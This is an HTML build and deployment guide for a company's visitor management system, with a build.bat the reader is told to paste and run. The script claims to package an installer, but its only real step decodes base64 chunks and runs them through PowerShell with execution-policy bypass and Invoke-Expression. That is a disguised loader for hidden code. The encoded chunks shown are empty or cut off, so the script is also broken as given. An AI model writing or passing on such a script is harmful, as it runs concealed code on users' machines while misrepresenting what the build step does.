<body>

    <h1>HydraSpecma India Private Limited</h1>
    <p style="font-size: 12pt; color: #666666; font-style: italic;">Visitor Management System (VMS) - Build & Deployment Guide</p>

    <div class="note">
        <div class="note-title">ℹ️ Document Purpose</div>
        This document provides detailed instructions on how to modify the VMS source code, recompile the main executable, and package it into a single-file installer (<code>VMS_Setup.exe</code>) for distribution.
    </div>

    <h2>1. Packaging the Installer (using build.bat)</h2>
    <p>To bundle the application and its dependencies into a single, self-extracting executable (<code>VMS_Setup.exe</code>), you must place specific files in a single directory.</p>

    <h3>Required Files Checklist</h3>
    <div class="file-list">
        <ul>
            <li><strong><code>vms.exe</code></strong> — The compiled backend Node.js standalone application.</li>
            <li><strong><code>config.json</code></strong> — The server configuration file (containing Port, SMTP, and DB paths).</li>
            <li><strong><code>employees.csv</code></strong> — The employee staff directory template.</li>
            <li><strong><code>userdata.csv</code></strong> — The userdata template file.</li>
            <li><strong><code>build.bat</code></strong> — The packaging automation script (provided below).</li>
        </ul>
    </div>

    <h3>build.bat Source Code</h3>
    <p>Create a text file named <code>build.bat</code> in the folder and paste the following script inside:</p>
    
    <pre>@echo off
echo ===================================================
echo             HydraSpecma VMS Setup Builder          
echo ===================================================
echo.

setlocal enabledelayedexpansion

:: Check if required files are present in the current directory
set MISSING=0
if not exist "vms.exe" ( echo Error: vms.exe is missing in current folder! ^&amp; set MISSING=1 )
if not exist "config.json" ( echo Error: config.json is missing in current folder! ^&amp; set MISSING=1 )
if not exist "employees.csv" ( echo Error: employees.csv is missing in current folder! ^&amp; set MISSING=1 )
if not exist "userdata.csv" ( echo Error: userdata.csv is missing in current folder! ^&amp; set MISSING=1 )

if "!MISSING!"=="1" (
    echo.
    echo Please make sure all 4 files are in this folder before running.
    echo.
    pause
    exit /b 1
)

echo Starting compilation and build process...
echo Please wait...
echo.

:: Load base64 encoded payload in chunks
set "B64_            "
set "B64_"

:: Write chunks to a temp file to avoid CMD command line length limit (8191 chars)
echo !B64_1!> temp_payload.b64
echo !B64_2!>> temp_payload.b64

:: Decode and run using PowerShell
powershell -NoProfile -ExecutionPolicy Bypass -Command "$encoded = Get-Content temp_payload.b64 -Raw; $encoded = $encoded -replace '\\s',''; $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)); Invoke-Expression $decoded"

:: Clean up temp file
if exist temp_payload.b64 del temp_payload.b64

echo.
echo Process complete.
pause</pre>

    <h2>2. Modifying the Main Application (vms.exe)</h2>
    <p>Because <code>vms.exe</code> is a compiled binary containing the server-side logic and client interface, you cannot edit it directly. Instead, you modify the source files and rebuild it.</p>
    
    <h3>Rebuilding Steps</h3>
    <ol>
        <li><strong>Edit the Source Code</strong>: Open and edit the HTML/CSS/JS source files directly in your workspace (such as <code>public/index.html</code>, <code>public/css/style.css</code>, or <code>server.js</code>).</li>
        <li><strong>Install Node.js</strong>: Download and install the current LTS version of Node.js from <a href="https://nodejs.org/" target="_blank">nodejs.org</a> on your development PC.</li>
        <li><strong>Open Terminal</strong>: Open your Command Prompt (cmd) or PowerShell and navigate to the project root directory.</li>
        <li><strong>Install Dependencies</strong>: Run the install command to fetch backend libraries:
            <pre>npm install</pre>
        </li>
        <li><strong>Compile the Executable</strong>: Run the pack command to package your modified sources into the <code>vms.exe</code> binary:
            <pre>npx pkg . --targets node18-win-x64 -o vms.exe</pre>
        </li>
        <li><strong>Update Setup Installer</strong>: Copy the new <code>vms.exe</code> to your deployment folder and run <code>build.bat</code> to compile it into the new installer package.</li>
    </ol>

    <h2>3. Troubleshooting & Safety Tips</h2>
    
    <h3>Fixing "Access is denied" Compile Errors</h3>
    <p>If you get an <code>Access is denied</code> error while building the executables, it means that the previous version of the application or setup installer is still running in the background and has locked the output files (<code>vms.exe</code> or <code>VMS_Setup.exe</code>).</p>
    <p><strong>To resolve this:</strong></p>
    <ol>
        <li>Open Windows <strong>Task Manager</strong>.</li>
        <li>Locate any running processes named <code>vms.exe</code>, <code>vms</code>, <code>VMS_Setup.exe</code>, or <code>VMS_Setup</code>.</li>
        <li>Right-click each and select <strong>End Task</strong>.</li>
        <li>Re-run the build script.</li>
    </ol>

</body>
